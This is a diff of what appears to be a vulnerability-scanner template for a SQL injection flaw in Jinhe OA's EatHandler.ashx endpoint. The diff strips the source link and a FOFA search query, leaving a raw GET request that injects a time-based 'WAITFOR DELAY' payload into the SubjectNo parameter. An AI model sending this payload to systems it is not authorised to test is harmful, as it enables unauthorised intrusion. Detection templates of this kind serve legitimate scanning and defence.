@@ -3,12 +3,8 @@ info:
   name: 金和OA EatHandler.ashx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kze457eigl5dpe63'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kze457eigl5dpe63
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
   - 'GET /c6/JHSoft.Web.CostU8/EAI/EatHandler.ashx?SubjectNo=1;WAITFOR+DELAY+''0:0:5''--%20&State=code HTTP/1.1
